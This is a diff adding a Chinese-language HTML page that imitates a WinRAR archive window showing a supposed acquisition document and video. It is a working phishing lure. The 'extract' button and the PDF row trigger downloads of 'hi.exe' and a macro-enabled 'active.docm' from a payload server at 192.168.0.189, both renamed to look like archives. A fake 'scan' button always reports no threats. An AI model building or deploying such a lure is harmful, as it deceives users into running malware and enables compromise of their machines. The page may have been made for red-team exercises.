@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" type="text/css" href="css/styling.css">
+	<title>文件资源管理器 - WinRAR</title>
+	<link rel="icon" type="image/png" href="css/images/folder.png">
+	<link rel="icon" href="css/images/folder.png" type="image/x-icon" />
+</head>
+<body>
+
+<div id="main">
+	<div id="menu-bar">
+		<span>
+			<img src="css/images/winrar-logo.png" width="15px"> <span style="font-size:12px; position: relative; top: -2px;">WinRAR</span>
+		</span>
+		<span id="title">
+			Document.zip - WinRAR (评估版本)
+		</span>
+		<span>
+			<!--
+			<div>
+				<span id="minimize">&#8212;</span>
+				<span id="square">□</span>
+				<span id="exit">✕</span>
+			</div>
+			-->
+		</span>
+	</div>
+	<div id="winrar-options">
+		<span class="winrar-btn" style="margin-left:5px;"  onclick="extract()">
+			<div style="margin:auto">
+				<img src="css/images/extract.png" width="40px">
+			</div>
+			<div class="winrar-txt">
+				解压到
+			</div>
+		</span>
+		<span class="winrar-btn" onclick="error()">
+			<div>
+				<img src="css/images/add.png" width="40px">
+			</div>
+			<div class="winrar-txt">
+				添加
+			</div>
+		</span>
+		<span class="winrar-btn" onclick="error()">
+			<div>
+				<img src="css/images/test.png" width="40px">
+			</div>
+			<div class="winrar-txt">
+				测试
+			</div>
+		</span>
+		<span class="winrar-btn" onclick="error()">
+			<div>
+				<img src="css/images/view.png" width="40px">
+			</div>
+			<div class="winrar-txt">
+				查看
+			</div>
+		</span>
+		<span class="winrar-btn" onclick="runScan()">
+			<div>
+				<img src="css/images/scan.png" width="40px">
+			</div>
+			<div class="winrar-txt">
+				扫描
+			</div>
+		</span>
+	</div>
+	<div style="display: flex; flex-direction: row;">
+		<span style="position:relative; top:10px; margin-left: 10px; margin-right: 10px;">
+			<img src="css/images/up.png" width="15px">
+		</span>
+		<div class="home d-flex align-items-center">
+			<div>
+				<img src="css/images/folder.png" width="20px" style="margin-left:4px; margin-top:2px;">
+				<span id="system-path">C:\Users\Administrator\Downloads\Document.zip</span>
+			</div>
+		</div>	
+	</div>
+
+	<div class="file-container">
+		<div class="container">
+			<table class="files">
+				<thead>
+				  <tr>
+					<th>名称</th>
+					<th>大小</th>
+					<th>类型</th>
+					<th>修改时间</th>
+				  </tr>
+				</thead>
+				<tbody>
+				  <tr onclick="downloadFakePdf()">
+					<td>
+						<img src="css/images/pdf.png" width="15px"> <span style="position: relative; top:-2px;">收购文档.pdf</span>
+					</td>
+					<td>100 KB</td>
+					<td>文档</td>
+					<td>2025/1/8 1:32</td>
+				  </tr>				  
+				  <tr>
+					<td>
+						<img src="css/images/exe.png" width="15px"> <span style="position: relative; top:-2px;">收购视频.exe</span>
+					</td>
+					<td>5 MB</td>
+					<td>可执行文件</td>
+					<td>2025/1/8 1:32</td>
+				  </tr>
+				  
+				  <!-- 根据需要添加更多行 -->
+				  <!--
+				  <tr>
+					<td>File 2</td>
+					<td>5 MB</td>
+					<td>Image</td>
+					<td>April 15, 2023</td>
+				  </tr>
+				  -->
+				</tbody>
+			  </table>
+		</div>
+	</div>
+</div>
+
+
+
+<div id="warningBox">
+	<div id="warningHeader">
+	  <span>警告</span>
+	</div>
+	<div id="warningMessage">
+	<img src="css/images/warning.png" width="40px" alt="Warning Icon"><p style="margin-left: 10px;">无法执行请求的操作</p>
+	</div>
+	<div id="warningFooter">
+	  <button id="warningButton" onclick="hide()">确定</button>
+	</div>
+</div>
+
+<div id="successBox">
+	<div id="successHeader">
+	  <span>未发现威胁</span>
+	</div>
+	<div id="successMessage" style="display:flex; align-items: center;">
+	  <img src="css/images/clean.png" width="40px">
+	  <p style="margin-left: 10px;" id="numOfRows"></p>
+	</div>
+	<div id="successFooter">
+	  <button id="successButton" onclick="hideScan()">取消</button>
+	</div>
+</div>
+
+</body>
+
+<script>
+
+var rows = document.querySelectorAll('.files tr');
+var rowCount = rows.length;
+
+//为每一行添加点击事件监听器
+for (var i = 0; i < rows.length; i++) {
+  rows[i].addEventListener('click', function(event) {
+    event.stopPropagation();
+
+    //从任何其他行中删除选定的类
+    for (var j = 0; j < rows.length; j++) {
+      rows[j].classList.remove('selected');
+
+      //重置其他行第一个单元格的背景颜色
+      if (rows[j].querySelector('td')) {
+        rows[j].querySelector('td').style.backgroundColor = '';
+      }
+    }
+
+    //将选定的类添加到单击的行
+    this.classList.add('selected');
+
+    //删除所点击行的第一个单元格的背景颜色
+    if (this.querySelector('td')) {
+      this.querySelector('td').style.backgroundColor = 'inherit';
+    }
+  });
+}
+
+//为文档添加点击事件监听器
+document.addEventListener('click', function() {
+  //从所有行中删除选定的类
+  for (var i = 0; i < rows.length; i++) {
+    rows[i].classList.remove('selected');
+
+    //重置所有行第一个单元格的背景颜色
+    if (rows[i].querySelector('td')) {
+      rows[i].querySelector('td').style.backgroundColor = '';
+    }
+  }
+});
+</script>
+
+<script>
+	function hide(){
+  		document.getElementById("warningBox").style.display = 'none';
+	}
+
+	function hideScan(){
+  		document.getElementById("successBox").style.display = 'none';
+	}
+
+	function runScan() {
+		var rows = document.querySelectorAll('.files tr');
+		var rowCount = rows.length - 1;
+		var mssg = document.getElementById("numOfRows");
+		mssg.innerHTML = rowCount + ' 个文件已扫描。未发现威胁。';
+		document.getElementById("successBox").style.display = 'block';
+	}
+
+	function error(){
+		document.getElementById("warningBox").style.display = 'block';
+	}
+
+	function extract() {
+  //需要下载的文件的 URL
+  const fileUrl = 'http://192.168.0.189/payload/hi.exe';
+
+  const link = document.createElement('a');
+  link.href = fileUrl;
+  link.download = '收购.zip.exe';
+
+  document.body.appendChild(link);
+
+  link.click();
+
+  document.body.removeChild(link);
+}
+
+	function downloadFakePdf(){
+	//需要下载的文件的 URL
+  const fileUrl = 'http://192.168.0.189/payload/white/active.docm';
+
+  const link = document.createElement('a');
+  link.href = fileUrl;
+  link.download = '收购.zip.docm';
+
+  document.body.appendChild(link);
+
+  link.click();
+
+  document.body.removeChild(link);
+	}
+</script>
+</html>
